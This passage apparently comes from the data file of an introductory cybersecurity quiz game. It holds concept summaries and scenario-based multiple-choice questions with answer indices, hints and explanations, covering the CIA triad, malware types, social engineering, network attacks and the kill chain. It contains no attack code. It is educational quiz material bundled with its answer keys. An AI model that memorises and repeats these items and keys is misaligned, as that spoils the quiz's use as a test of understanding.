// ===== CYBERQUEST DATA – All 8 Modules, All Questions =====
// Questions are stored with options scrambled; correctIndex is tracked accurately.

const MODULES = [
  // ─────────────────────────────────────────────────────
  // MODULE 1 – Foundations of Cybersecurity
  // ─────────────────────────────────────────────────────
  {
    id: 1, num: "1",
    title: "Foundations of Cybersecurity",
    icon: "🔐",
    desc: "CIA triad, threats, risk, controls, frameworks & ethics",
    color: "#00d4ff",
    levels: [
      {
        id: "1-1", title: "CIA Triad & Core Concepts", slides: "1-20",
        concept: {
          title: "CIA Triad & Core Concepts",
          body: [
            { type: "line", text: "CYBERSECURITY = protecting information systems from threats, damage, or unauthorised access." },
            { type: "empty" },
            { type: "section", text: "The CIA Triad" },
            { type: "bullet", text: "CONFIDENTIALITY – ensuring only authorised parties can access data." },
            { type: "bullet", text: "INTEGRITY – ensuring data is accurate and has not been tampered with." },
            { type: "bullet", text: "AVAILABILITY – ensuring systems and data are accessible when needed." },
            { type: "empty" },
            { type: "section", text: "Key Terms" },
            { type: "bullet", text: "ASSET – anything of value (hardware, software, data, people)." },
            { type: "bullet", text: "THREAT – potential event that could harm assets." },
            { type: "bullet", text: "VULNERABILITY – weakness that can be exploited." },
            { type: "bullet", text: "RISK = Threat × Vulnerability × Impact." },
            { type: "bullet", text: "CONTROL – measure that reduces risk." },
            { type: "empty" },
            { type: "line", text: "NON-REPUDIATION: preventing someone from denying they performed an action (e.g., digital signatures)." },
          ]
        },
        questions: [
          {
            q: "A hospital's patient records are encrypted so only authorised staff can view them. Which CIA property is being protected?",
            opts: ["Integrity", "Availability", "Confidentiality", "Non-repudiation"],
            correct: 2,
            hint: "Confidentiality ensures only authorised parties can access information.",
            wrongReasons: {
              0: "Integrity is about preventing unauthorised modification of data, not restricting who can view it.",
              1: "Availability ensures data is accessible when needed, not restricted.",
              3: "Non-repudiation prevents denial of actions, not about access restriction."
            }
          },
          {
            q: "An attacker modifies financial records in a database to show incorrect balances. Which CIA property is violated?",
            opts: ["Confidentiality", "Integrity", "Availability", "Authentication"],
            correct: 1,
            hint: "Integrity ensures data is accurate and has not been tampered with.",
            wrongReasons: {
              0: "Confidentiality is about who can see the data, not about modifying it.",
              2: "Availability is about whether systems are accessible, not accurate.",
              3: "Authentication is about verifying identity, not data accuracy."
            }
          },
          {
            q: "A ransomware attack encrypts a hospital's systems, preventing doctors from accessing patient records during an emergency. Which CIA property is primarily violated?",
            opts: ["Confidentiality", "Integrity", "Availability", "Non-repudiation"],
            correct: 2,
            hint: "When systems cannot be accessed when needed, Availability is the affected property.",
            wrongReasons: {
              0: "The records are locked, not exposed. Confidentiality is not the primary concern here.",
              1: "The data has not been changed or tampered with.",
              3: "Non-repudiation deals with denying actions, not system access."
            }
          },
          {
            q: "A user digitally signs an email so the recipient can prove the sender cannot deny sending it. What security property does this provide?",
            opts: ["Confidentiality", "Availability", "Integrity", "Non-repudiation"],
            correct: 3,
            hint: "Non-repudiation prevents someone from denying they performed an action.",
            wrongReasons: {
              0: "Confidentiality limits who can read the message, not who sent it.",
              1: "Availability is about access to systems.",
              2: "Integrity ensures the message hasn't been changed, but digital signatures also provide proof of origin."
            }
          },
          {
            q: "Which formula best represents RISK in cybersecurity?",
            opts: ["Threat + Vulnerability", "Threat × Vulnerability × Impact", "Control ÷ Asset", "Vulnerability – Control"],
            correct: 1,
            hint: "Risk takes into account the likelihood (threat/vulnerability) and the potential damage (impact).",
            wrongReasons: {
              0: "Addition misses the impact dimension, which determines severity.",
              2: "Control reduces risk but is not a multiplier of asset value.",
              3: "Subtracting control from vulnerability is not the standard risk formula."
            }
          }
        ]
      },
      {
        id: "1-2", title: "Threats, Vulnerabilities & Attackers", slides: "21-42",
        concept: {
          title: "Threats, Vulnerabilities & Attackers",
          body: [
            { type: "section", text: "Types of Threats" },
            { type: "bullet", text: "MALWARE – malicious software (viruses, worms, ransomware, trojans, spyware)." },
            { type: "bullet", text: "PHISHING – deceptive messages tricking users into revealing data." },
            { type: "bullet", text: "SOCIAL ENGINEERING – manipulating humans to bypass security." },
            { type: "bullet", text: "INSIDER THREAT – threat from within the organisation." },
            { type: "bullet", text: "APT (Advanced Persistent Threat) – long-term, sophisticated, targeted attack." },
            { type: "empty" },
            { type: "section", text: "Attacker Types" },
            { type: "bullet", text: "Black Hat – malicious hackers." },
            { type: "bullet", text: "White Hat – ethical hackers (penetration testers)." },
            { type: "bullet", text: "Grey Hat – hack without permission but reveal findings." },
            { type: "bullet", text: "Script Kiddie – uses pre-made tools without deep understanding." },
            { type: "bullet", text: "Hacktivist – hacks for ideological/political reasons." },
            { type: "empty" },
            { type: "section", text: "Attack Categories" },
            { type: "bullet", text: "PASSIVE – observe/collect without altering (eavesdropping)." },
            { type: "bullet", text: "ACTIVE – alter, disrupt, or destroy systems." },
            { type: "bullet", text: "INTERNAL – from inside the organisation." },
            { type: "bullet", text: "EXTERNAL – from outside the organisation." },
          ]
        },
        questions: [
          {
            q: "An employee receives an email claiming to be from their bank, asking them to click a link and enter their login credentials. The link leads to a fake website. What type of attack is this?",
            opts: ["Ransomware", "Phishing", "Insider threat", "Denial of service"],
            correct: 1,
            hint: "Phishing uses deceptive messages to trick users into revealing credentials.",
            wrongReasons: {
              0: "Ransomware encrypts files and demands payment. No encryption occurred here.",
              2: "An insider threat comes from within the organisation, not an external email.",
              3: "DoS disrupts access to services. This is about stealing credentials."
            }
          },
          {
            q: "A cybersecurity professional is hired by a company to attempt to break into their systems to find vulnerabilities before real attackers do. What type of hacker are they?",
            opts: ["Black hat hacker", "White hat hacker", "Grey hat hacker", "Script kiddie"],
            correct: 1,
            hint: "Ethical hackers hired by organisations are called white hat hackers.",
            wrongReasons: {
              0: "Black hats have malicious intent and act without authorisation.",
              2: "Grey hats hack without permission but may disclose findings. This person is hired.",
              3: "Script kiddies use premade tools without understanding. Professionals conduct real pen tests."
            }
          },
          {
            q: "A nation-state quietly installs malware on a target company's network and remains undetected for 18 months, slowly exfiltrating intellectual property. What type of threat is this?",
            opts: ["Script kiddie attack", "Advanced Persistent Threat (APT)", "Opportunistic phishing", "Insider threat"],
            correct: 1,
            hint: "APTs are long-term, sophisticated, and targeted attacks.",
            wrongReasons: {
              0: "Script kiddies use simple, non-targeted attacks with premade tools.",
              2: "Phishing is opportunistic and targets credentials, not long-term infiltration.",
              3: "Insider threats come from within the organisation. This attacker is external."
            }
          },
          {
            q: "An attacker intercepts network traffic between two users without modifying it, simply collecting information. What category of attack is this?",
            opts: ["Active attack", "Passive attack", "Insider attack", "Social engineering"],
            correct: 1,
            hint: "Passive attacks observe and collect data without altering systems.",
            wrongReasons: {
              0: "Active attacks alter, disrupt, or destroy. No modification occurred here.",
              2: "Insider attacks come from within the organisation.",
              3: "Social engineering manipulates people, not network traffic."
            }
          },
          {
            q: "A trusted database administrator exports sensitive customer data and sells it to a competitor. What type of threat actor is this?",
            opts: ["External attacker", "Hacktivist", "Insider threat", "Script kiddie"],
            correct: 2,
            hint: "Threats coming from within the organisation, such as employees, are insider threats.",
            wrongReasons: {
              0: "External attackers come from outside. The DBA has internal access.",
              1: "Hacktivists are motivated by political or ideological causes, not financial gain.",
              3: "Script kiddies use premade tools without understanding. This is a deliberate misuse of privileges."
            }
          }
        ]
      },
      {
        id: "1-3", title: "Security Controls & Frameworks", slides: "43-62",
        concept: {
          title: "Security Controls & Frameworks",
          body: [
            { type: "section", text: "Types of Security Controls" },
            { type: "bullet", text: "PREVENTIVE – stop attacks before they happen (firewalls, encryption, access control)." },
            { type: "bullet", text: "DETECTIVE – identify attacks while or after occurring (IDS, logs, audits)." },
            { type: "bullet", text: "CORRECTIVE – restore systems after an attack (backups, incident response)." },
            { type: "bullet", text: "DETERRENT – discourage attackers (CCTV signs, warning banners)." },
            { type: "empty" },
            { type: "section", text: "Control Categories" },
            { type: "bullet", text: "TECHNICAL – implemented by technology (firewalls, antivirus, encryption)." },
            { type: "bullet", text: "ADMINISTRATIVE – policies, procedures, training." },
            { type: "bullet", text: "PHYSICAL – physical barriers (locks, guards, badge access)." },
            { type: "empty" },
            { type: "section", text: "Key Frameworks" },
            { type: "bullet", text: "NIST CSF – Identify, Protect, Detect, Respond, Recover." },
            { type: "bullet", text: "ISO/IEC 27001 – international standard for information security management." },
            { type: "bullet", text: "GDPR – EU data protection regulation." },
            { type: "bullet", text: "DEFENSE IN DEPTH – multiple layered controls so one failure doesn't compromise all." },
          ]
        },
        questions: [
          {
            q: "A company installs a firewall to block malicious traffic before it reaches their network. What type of security control is this?",
            opts: ["Detective", "Corrective", "Preventive", "Deterrent"],
            correct: 2,
            hint: "Preventive controls stop attacks before they happen.",
            wrongReasons: {
              0: "Detective controls identify attacks that are occurring or have occurred.",
              1: "Corrective controls restore systems after an attack.",
              3: "Deterrent controls discourage attackers but don't directly stop traffic."
            }
          },
          {
            q: "After a ransomware attack, a company restores their systems from clean backups. What type of control are the backups serving as?",
            opts: ["Preventive", "Detective", "Corrective", "Deterrent"],
            correct: 2,
            hint: "Corrective controls restore systems after an incident.",
            wrongReasons: {
              0: "Backups don't prevent the ransomware from executing.",
              1: "Backups don't detect the attack – they help recover from it.",
              3: "Deterrent controls discourage future attacks, not restore from them."
            }
          },
          {
            q: "An intrusion detection system (IDS) monitors network traffic and sends an alert when unusual activity is found. What type of control is an IDS?",
            opts: ["Preventive", "Detective", "Corrective", "Deterrent"],
            correct: 1,
            hint: "Detective controls identify attacks as they occur or after they occur.",
            wrongReasons: {
              0: "An IDS monitors and alerts; it doesn't prevent the attack.",
              2: "Corrective controls restore systems after an attack.",
              3: "Deterrents discourage attacks; IDS detects, not discourages."
            }
          },
          {
            q: "A company places 'This area is monitored by CCTV' signs at entry points to make potential attackers think twice. What type of control is this?",
            opts: ["Preventive", "Detective", "Corrective", "Deterrent"],
            correct: 3,
            hint: "Deterrent controls discourage attackers by making them fear consequences.",
            wrongReasons: {
              0: "Preventive controls actively block attacks. Signs don't technically block anything.",
              1: "Detective controls identify attacks. Signs don't detect anything.",
              2: "Corrective controls restore systems after an attack."
            }
          },
          {
            q: "An organisation implements multiple layers of security: firewalls, encryption, access control, and monitoring. Even if an attacker bypasses the firewall, other controls still protect assets. What concept is this?",
            opts: ["Zero trust", "Defense in depth", "Least privilege", "Separation of duties"],
            correct: 1,
            hint: "Defense in depth means multiple overlapping layers of protection.",
            wrongReasons: {
              0: "Zero trust assumes no component is trusted automatically. Defense in depth is about overlapping controls.",
              2: "Least privilege limits permissions. Defense in depth is about layering controls.",
              3: "Separation of duties divides tasks. Defense in depth layers security controls."
            }
          },
          {
            q: "An organisation adopts the NIST Cybersecurity Framework. Which of the following is NOT one of the five NIST CSF core functions?",
            opts: ["Identify", "Protect", "Isolate", "Respond"],
            correct: 2,
            hint: "The five NIST CSF functions are: Identify, Protect, Detect, Respond, Recover.",
            wrongReasons: {
              0: "Identify IS one of the five NIST CSF functions.",
              1: "Protect IS one of the five NIST CSF functions.",
              3: "Respond IS one of the five NIST CSF functions. 'Isolate' is not."
            }
          }
        ]
      },
      {
        id: "1-4", title: "Cryptography Basics", slides: "63-85",
        concept: {
          title: "Cryptography Basics",
          body: [
            { type: "line", text: "CRYPTOGRAPHY = art of securing information by transforming it into an unreadable form." },
            { type: "empty" },
            { type: "section", text: "Key Concepts" },
            { type: "bullet", text: "PLAINTEXT – original readable data." },
            { type: "bullet", text: "CIPHERTEXT – encrypted, unreadable data." },
            { type: "bullet", text: "ENCRYPTION – converting plaintext → ciphertext." },
            { type: "bullet", text: "DECRYPTION – converting ciphertext → plaintext." },
            { type: "empty" },
            { type: "section", text: "Types of Encryption" },
            { type: "bullet", text: "SYMMETRIC – same key for encrypt & decrypt. Fast. Key sharing is a challenge. (AES, DES)." },
            { type: "bullet", text: "ASYMMETRIC – public key encrypts, private key decrypts. Solves key distribution. Slower. (RSA)." },
            { type: "empty" },
            { type: "section", text: "Hashing" },
            { type: "bullet", text: "ONE-WAY function – converts data to fixed-length digest." },
            { type: "bullet", text: "Cannot be reversed. Used for password storage and file integrity." },
            { type: "bullet", text: "Common: SHA-256, MD5 (now considered weak)." },
            { type: "empty" },
            { type: "line", text: "PUBLIC KEY INFRASTRUCTURE (PKI): system of digital certificates to verify identities online." },
          ]
        },
        questions: [
          {
            q: "A messaging app encrypts messages using the same key for both encryption and decryption. This key must be shared between sender and receiver. What type of encryption is this?",
            opts: ["Asymmetric encryption", "Symmetric encryption", "Hashing", "Public key infrastructure"],
            correct: 1,
            hint: "Symmetric encryption uses the same key for both encrypting and decrypting.",
            wrongReasons: {
              0: "Asymmetric uses two keys – a public key for encryption and a private key for decryption.",
              2: "Hashing is one-way and cannot be decrypted.",
              3: "PKI is a system for managing digital certificates."
            }
          },
          {
            q: "Bob wants to send an encrypted message to Alice. He uses Alice's public key to encrypt it. Only Alice can decrypt it using her private key. What type of encryption is this?",
            opts: ["Symmetric encryption", "Hashing", "Asymmetric encryption", "Steganography"],
            correct: 2,
            hint: "Asymmetric encryption uses a public key to encrypt and a private key to decrypt.",
            wrongReasons: {
              0: "Symmetric uses the same key for both operations.",
              1: "Hashing is a one-way transformation and cannot be decrypted.",
              3: "Steganography hides data within other data, not encrypts it."
            }
          },
          {
            q: "A website stores user passwords as hashed values. When a user logs in, the system hashes their input and compares it to the stored hash. Why is hashing preferred over storing passwords in plaintext?",
            opts: ["Hashing is faster than encryption", "Hashing is one-way — even if the database is stolen, the original password cannot be easily recovered", "Hashed passwords take up less storage space", "Hashing automatically logs users in"],
            correct: 1,
            hint: "Hashing is a one-way function — you can't reverse it to get the original password.",
            wrongReasons: {
              0: "Speed is not the primary reason for password hashing.",
              2: "Storage size is not the motivation for hashing passwords.",
              3: "Hashing has nothing to do with the login process itself."
            }
          },
          {
            q: "Which of the following is the primary advantage of asymmetric encryption over symmetric encryption?",
            opts: ["Asymmetric is much faster", "Asymmetric solves the key distribution problem — no need to share a secret key", "Asymmetric uses shorter keys", "Asymmetric is immune to all attacks"],
            correct: 1,
            hint: "With asymmetric encryption, you can share your public key openly without compromising security.",
            wrongReasons: {
              0: "Asymmetric encryption is actually slower than symmetric.",
              2: "Asymmetric keys (e.g., RSA 2048-bit) are typically longer than symmetric keys.",
              3: "No encryption is immune to all attacks."
            }
          }
        ]
      },
      {
        id: "1-5", title: "Ethics, Law & Professional Responsibility", slides: "86-105",
        concept: {
          title: "Ethics, Law & Professional Responsibility",
          body: [
            { type: "section", text: "Professional Ethics" },
            { type: "bullet", text: "Cybersecurity professionals have access to sensitive systems and data." },
            { type: "bullet", text: "Responsibility to act ethically, legally, and in the public interest." },
            { type: "bullet", text: "Codes of ethics: (ISC)² Code, ACM Code, EC-Council Code." },
            { type: "empty" },
            { type: "section", text: "Key Ethical Principles" },
            { type: "bullet", text: "INTEGRITY – be honest; never misuse access." },
            { type: "bullet", text: "CONFIDENTIALITY – protect client data; don't disclose without permission." },
            { type: "bullet", text: "COMPETENCE – only take work within your skills." },
            { type: "bullet", text: "PUBLIC INTEREST – protect society, not just clients." },
            { type: "empty" },
            { type: "section", text: "Legal Frameworks" },
            { type: "bullet", text: "GDPR – EU regulation: data minimisation, right to erasure, consent required." },
            { type: "bullet", text: "CFAA – US Computer Fraud and Abuse Act: criminalises unauthorised computer access." },
            { type: "bullet", text: "Computer Misuse Act (UK) – covers unauthorised access, modification, DoS." },
            { type: "empty" },
            { type: "line", text: "RESPONSIBLE DISCLOSURE: finding a vulnerability and reporting it to the vendor before going public." },
          ]
        },
        questions: [
          {
            q: "A penetration tester discovers a critical vulnerability in a client's system during an authorised test. They privately notify the client and give them 30 days to fix it before publishing findings. What is this practice called?",
            opts: ["Black hat hacking", "Zero-day exploitation", "Responsible disclosure", "Social engineering"],
            correct: 2,
            hint: "Responsible disclosure means reporting vulnerabilities to the vendor before making them public.",
            wrongReasons: {
              0: "Black hat hacking is malicious and unauthorised.",
              1: "Zero-day exploitation means actively attacking using an undisclosed vulnerability.",
              3: "Social engineering manipulates people — it doesn't describe how to handle vulnerability findings."
            }
          },
          {
            q: "A cybersecurity consultant completes a penetration test for a company. A week later, a friend at a competing company asks them about the client's security weaknesses. The consultant shares the details. Which ethical principle is violated?",
            opts: ["Competence", "Public interest", "Confidentiality", "Integrity"],
            correct: 2,
            hint: "Confidentiality requires protecting client data and not disclosing it without permission.",
            wrongReasons: {
              0: "Competence is about having the skills for the work performed.",
              1: "Public interest is about protecting society. The issue here is disclosing client secrets.",
              3: "Integrity is about honesty and not misusing access."
            }
          },
          {
            q: "An organisation operating in the European Union collects only the minimum amount of personal data needed for its service and deletes it when no longer needed. Which regulation does this comply with?",
            opts: ["CFAA", "Computer Misuse Act", "GDPR", "HIPAA"],
            correct: 2,
            hint: "GDPR includes the principles of data minimisation and storage limitation.",
            wrongReasons: {
              0: "CFAA (Computer Fraud and Abuse Act) is a US law about unauthorised computer access.",
              1: "Computer Misuse Act is a UK law about hacking, not data protection.",
              3: "HIPAA is a US law specifically for healthcare data."
            }
          },
          {
            q: "A security researcher discovers a new critical vulnerability in widely-used software. They immediately publish full technical details online, including exploit code, without contacting the vendor. What is the main ethical concern?",
            opts: ["They should have kept it secret forever", "Publishing immediately without vendor notification puts users at risk before a fix exists", "Vulnerability research is always unethical", "They should have only told the government"],
            correct: 1,
            hint: "Publishing exploit details before a patch exists gives attackers free tools to harm users.",
            wrongReasons: {
              0: "Permanent secrecy doesn't help users either. The issue is timing and process.",
              2: "Vulnerability research is an important and ethical practice when done responsibly.",
              3: "Government notification alone is not the responsible disclosure process."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 2.1 – Cyber Threat Landscape Part 1
  // ─────────────────────────────────────────────────────
  {
    id: 2, num: "2.1",
    title: "Cyber Threat Landscape",
    icon: "⚠️",
    desc: "Malware types, attack vectors, reconnaissance & social engineering",
    color: "#ff6b6b",
    levels: [
      {
        id: "2-1", title: "Malware Types & Behaviour", slides: "1-25",
        concept: {
          title: "Malware Types & Behaviour",
          body: [
            { type: "section", text: "Types of Malware" },
            { type: "bullet", text: "VIRUS – attaches to files; needs human action to spread. Can corrupt data." },
            { type: "bullet", text: "WORM – self-replicates across networks automatically. No host file needed." },
            { type: "bullet", text: "TROJAN – disguises itself as legitimate software to trick users." },
            { type: "bullet", text: "RANSOMWARE – encrypts victim's data and demands payment for the key." },
            { type: "bullet", text: "SPYWARE – silently collects user data (keystrokes, passwords, browsing)." },
            { type: "bullet", text: "ROOTKIT – hides deep in the OS; provides hidden, persistent access." },
            { type: "bullet", text: "BOTNET – network of infected machines (bots) controlled by attacker." },
            { type: "bullet", text: "ADWARE – displays unwanted ads; may also track browsing." },
            { type: "empty" },
            { type: "section", text: "Key Distinction" },
            { type: "bullet", text: "Viruses need human action. Worms spread automatically." },
            { type: "bullet", text: "Trojans trick users. Rootkits hide from detection." },
          ]
        },
        questions: [
          {
            q: "A piece of malware spreads across an entire corporate network automatically without any user interaction, exploiting a vulnerability in network services. What type of malware is this?",
            opts: ["Virus", "Worm", "Trojan", "Adware"],
            correct: 1,
            hint: "Worms self-replicate across networks without requiring user action.",
            wrongReasons: {
              0: "Viruses require human action (e.g., opening a file) to spread.",
              2: "Trojans disguise themselves as legitimate software, they don't self-replicate.",
              3: "Adware displays unwanted advertisements."
            }
          },
          {
            q: "An attacker distributes a free 'game' that secretly installs malware when the user runs it. The malware appears harmless but gives the attacker remote access to the victim's computer. What type of malware is this?",
            opts: ["Worm", "Ransomware", "Trojan", "Spyware"],
            correct: 2,
            hint: "Trojans disguise themselves as legitimate or desirable software.",
            wrongReasons: {
              0: "Worms self-replicate across networks. A fake game doesn't do this.",
              1: "Ransomware encrypts files and demands payment.",
              3: "Spyware silently monitors; the key here is the disguise as legitimate software."
            }
          },
          {
            q: "A hospital's files are encrypted by malware and a message demands $50,000 in Bitcoin to restore access. Patient care is disrupted. What type of malware caused this?",
            opts: ["Spyware", "Rootkit", "Ransomware", "Botnet"],
            correct: 2,
            hint: "Ransomware encrypts data and demands payment for decryption.",
            wrongReasons: {
              0: "Spyware steals data silently but doesn't encrypt files or demand payment.",
              1: "Rootkits provide hidden access; they don't typically demand payment.",
              3: "Botnets are networks of controlled machines used for other attacks."
            }
          },
          {
            q: "Malware installs itself deep in a computer's operating system kernel, hides from antivirus software, and gives an attacker persistent access that survives reboots. What type is this?",
            opts: ["Worm", "Adware", "Ransomware", "Rootkit"],
            correct: 3,
            hint: "Rootkits hide deep in the OS and provide persistent, hidden access.",
            wrongReasons: {
              0: "Worms spread across networks. They don't hide in the OS kernel.",
              1: "Adware displays unwanted ads; it doesn't hide in the kernel.",
              2: "Ransomware encrypts data and demands payment. It doesn't primarily hide in the OS."
            }
          },
          {
            q: "An attacker compromises thousands of home computers and uses them together to send massive amounts of spam and launch attacks against websites. What is this collection of infected machines called?",
            opts: ["Spyware network", "Rootkit cluster", "Botnet", "Trojan army"],
            correct: 2,
            hint: "A botnet is a network of infected machines controlled remotely by an attacker.",
            wrongReasons: {
              0: "Spyware collects data from individual machines, not coordinate attacks.",
              1: "This is not a standard term — rootkits don't cluster.",
              3: "This is not a standard term — trojans don't form armies."
            }
          }
        ]
      },
      {
        id: "2-2", title: "Reconnaissance & Social Engineering", slides: "26-55",
        concept: {
          title: "Reconnaissance & Social Engineering",
          body: [
            { type: "section", text: "Reconnaissance" },
            { type: "bullet", text: "PASSIVE RECON – gathering info without directly touching the target (OSINT, Google, LinkedIn, Shodan)." },
            { type: "bullet", text: "ACTIVE RECON – directly probing the target (port scanning with nmap, network mapping)." },
            { type: "bullet", text: "OSINT – Open Source Intelligence: publicly available information." },
            { type: "empty" },
            { type: "section", text: "Social Engineering" },
            { type: "bullet", text: "PHISHING – bulk deceptive emails targeting many users." },
            { type: "bullet", text: "SPEAR PHISHING – highly targeted attack on specific individual using personal info." },
            { type: "bullet", text: "WHALING – spear phishing targeting senior executives (CEO, CFO)." },
            { type: "bullet", text: "VISHING – voice phishing (phone calls)." },
            { type: "bullet", text: "SMISHING – SMS-based phishing." },
            { type: "bullet", text: "PRETEXTING – fabricating a scenario to manipulate victims." },
            { type: "bullet", text: "BAITING – leaving physical media (USB) hoping victim will plug it in." },
            { type: "bullet", text: "TAILGATING – following authorised person through a secured door." },
          ]
        },
        questions: [
          {
            q: "A security researcher uses Google, LinkedIn, and public company websites to gather information about a target organisation without directly contacting or scanning it. What type of reconnaissance is this?",
            opts: ["Active reconnaissance", "Passive reconnaissance", "Vulnerability scanning", "Port scanning"],
            correct: 1,
            hint: "Passive reconnaissance uses publicly available information without directly touching the target.",
            wrongReasons: {
              0: "Active reconnaissance directly probes the target (e.g., port scanning).",
              2: "Vulnerability scanning actively probes systems for weaknesses.",
              3: "Port scanning is an active technique that directly probes a target's network."
            }
          },
          {
            q: "An attacker researches a company's CEO on LinkedIn, finds their name, job title, and current projects, then sends a personalised email posing as a trusted vendor. What type of attack is this?",
            opts: ["Phishing", "Spear phishing", "Vishing", "Smishing"],
            correct: 1,
            hint: "Spear phishing is highly targeted, using personal information about a specific individual.",
            wrongReasons: {
              0: "Phishing sends bulk generic emails to many users, not personalised to one person.",
              2: "Vishing uses voice calls (phone), not email.",
              3: "Smishing uses SMS text messages."
            }
          },
          {
            q: "An attacker leaves several USB drives labelled 'Salary Information' in the parking lot of a company. Curious employees plug the drives into work computers. What social engineering technique is this?",
            opts: ["Pretexting", "Tailgating", "Baiting", "Whaling"],
            correct: 2,
            hint: "Baiting uses physical media or enticing content to lure victims into helping the attacker.",
            wrongReasons: {
              0: "Pretexting involves fabricating a scenario or backstory to manipulate a victim.",
              1: "Tailgating is physically following someone through a secure door.",
              3: "Whaling targets senior executives specifically via targeted emails."
            }
          },
          {
            q: "An attacker calls an IT helpdesk pretending to be a stressed new employee who needs their password reset urgently before an important meeting. The helpdesk resets the password without verification. What technique was used?",
            opts: ["Phishing", "Baiting", "Vishing with pretexting", "Smishing"],
            correct: 2,
            hint: "Vishing is voice phishing, and pretexting involves fabricating a plausible scenario.",
            wrongReasons: {
              0: "Phishing uses emails, not phone calls.",
              1: "Baiting uses physical media to lure victims.",
              3: "Smishing uses text messages, not phone calls."
            }
          },
          {
            q: "A cybercriminal targets the CFO of a large corporation, carefully crafting a personalised email that appears to come from the company's law firm, requesting an urgent wire transfer of funds. What specific type of social engineering is this?",
            opts: ["Phishing", "Smishing", "Baiting", "Whaling"],
            correct: 3,
            hint: "Whaling is spear phishing specifically targeting senior executives like CEOs and CFOs.",
            wrongReasons: {
              0: "Phishing is generic and targets many people, not a specific executive.",
              1: "Smishing uses SMS text messages.",
              2: "Baiting uses physical media, not personalised targeted emails."
            }
          }
        ]
      },
      {
        id: "2-3", title: "Network Attacks & DoS", slides: "56-85",
        concept: {
          title: "Network Attacks & Denial of Service",
          body: [
            { type: "section", text: "Network Attack Types" },
            { type: "bullet", text: "MitM (Man-in-the-Middle) – attacker secretly intercepts and possibly modifies communications between two parties." },
            { type: "bullet", text: "REPLAY ATTACK – capturing and retransmitting valid data to gain access." },
            { type: "bullet", text: "ARP POISONING – sending fake ARP messages to redirect traffic." },
            { type: "bullet", text: "DNS SPOOFING – redirecting domain queries to malicious IP addresses." },
            { type: "bullet", text: "PACKET SNIFFING – capturing network packets to read data (requires encryption to prevent)." },
            { type: "empty" },
            { type: "section", text: "Denial of Service" },
            { type: "bullet", text: "DoS – one attacker floods a server with requests to make it unavailable." },
            { type: "bullet", text: "DDoS – many distributed sources (botnet) flood a target simultaneously. Harder to block." },
            { type: "bullet", text: "SYN FLOOD – exploits TCP handshake by sending many SYN requests without completing." },
            { type: "bullet", text: "Defenses: rate limiting, traffic filtering, CDN, anycast diffusion." },
          ]
        },
        questions: [
          {
            q: "An attacker on a coffee shop Wi-Fi intercepts the communication between a user's laptop and the bank's server, reading all transmitted data without either party knowing. What type of attack is this?",
            opts: ["DDoS attack", "SQL injection", "Man-in-the-Middle (MitM) attack", "Phishing"],
            correct: 2,
            hint: "A Man-in-the-Middle attack secretly intercepts communication between two parties.",
            wrongReasons: {
              0: "DDoS floods a server with traffic to make it unavailable.",
              1: "SQL injection targets database queries, not network communications.",
              3: "Phishing uses deceptive messages, not network interception."
            }
          },
          {
            q: "An attacker floods a web server with millions of requests per second from thousands of compromised computers worldwide, making the website unavailable to legitimate users. What type of attack is this?",
            opts: ["DoS attack", "DDoS attack", "Replay attack", "Phishing"],
            correct: 1,
            hint: "A DDoS attack comes from many distributed sources simultaneously.",
            wrongReasons: {
              0: "A DoS attack comes from a single source. This uses thousands of compromised computers.",
              2: "A replay attack captures and retransmits valid data, it doesn't flood servers.",
              3: "Phishing uses deceptive messages, not traffic floods."
            }
          },
          {
            q: "An attacker sends fake ARP messages on a local network, mapping their own MAC address to the default gateway's IP address, so all traffic routes through them. What attack enables traffic interception?",
            opts: ["DNS spoofing", "ARP poisoning", "SYN flood", "Replay attack"],
            correct: 1,
            hint: "ARP poisoning sends fake ARP messages to redirect network traffic through the attacker.",
            wrongReasons: {
              0: "DNS spoofing redirects domain name queries to malicious IP addresses.",
              2: "SYN flood exploits the TCP handshake to exhaust server resources.",
              3: "Replay attacks capture and retransmit valid data."
            }
          },
          {
            q: "An attacker captures a valid authentication token from a network and later re-sends the same token to gain access to a system without knowing the password. What attack is this?",
            opts: ["Phishing", "SYN flood", "Replay attack", "ARP poisoning"],
            correct: 2,
            hint: "Replay attacks capture and retransmit previously captured valid data.",
            wrongReasons: {
              0: "Phishing uses deceptive messages to trick users into revealing credentials.",
              1: "SYN flood exploits the TCP three-way handshake to exhaust server connections.",
              3: "ARP poisoning redirects local network traffic."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 2.2 – Attacks, Malware & Threat Modeling
  // ─────────────────────────────────────────────────────
  {
    id: 3, num: "2.2",
    title: "Attacks & Threat Modeling",
    icon: "🎯",
    desc: "Attack lifecycle, OWASP, threat modeling & vulnerability management",
    color: "#ff9d00",
    levels: [
      {
        id: "3-1", title: "The Attack Lifecycle", slides: "1-22",
        concept: {
          title: "The Attack Lifecycle (Cyber Kill Chain)",
          body: [
            { type: "line", text: "The Cyber Kill Chain describes the stages an attacker goes through to achieve their goal." },
            { type: "empty" },
            { type: "section", text: "7 Stages" },
            { type: "bullet", text: "1. RECONNAISSANCE – research target, gather info." },
            { type: "bullet", text: "2. WEAPONISATION – create exploit (e.g., malicious PDF)." },
            { type: "bullet", text: "3. DELIVERY – send weapon to target (email, USB, web)." },
            { type: "bullet", text: "4. EXPLOITATION – trigger the exploit, execute code." },
            { type: "bullet", text: "5. INSTALLATION – install malware for persistence." },
            { type: "bullet", text: "6. C2 (Command & Control) – attacker remotely controls compromised system." },
            { type: "bullet", text: "7. ACTIONS ON OBJECTIVES – achieve goal (steal data, encrypt, disrupt)." },
            { type: "empty" },
            { type: "line", text: "Breaking the kill chain at any stage prevents the attack from succeeding." },
          ]
        },
        questions: [
          {
            q: "An attacker scans a company's website, gathers employee names from LinkedIn, and identifies open ports using nmap. Which stage of the Cyber Kill Chain is this?",
            opts: ["Weaponisation", "Reconnaissance", "Delivery", "Installation"],
            correct: 1,
            hint: "Reconnaissance is the information-gathering stage — the first step of the Kill Chain.",
            wrongReasons: {
              0: "Weaponisation creates the exploit. Reconnaissance happens before that.",
              2: "Delivery sends the weapon to the target. This is before a weapon is even created.",
              3: "Installation installs malware — much later in the chain."
            }
          },
          {
            q: "After successfully exploiting a vulnerability, an attacker installs a backdoor that allows them to reconnect to the victim's machine even after it reboots. What stage is this?",
            opts: ["Exploitation", "Delivery", "Installation", "C2"],
            correct: 2,
            hint: "The Installation stage establishes persistence on the compromised system.",
            wrongReasons: {
              0: "Exploitation triggers the vulnerability. Installation follows after.",
              1: "Delivery sends the weapon to the target.",
              3: "C2 is the communication channel between the attacker and the compromised machine."
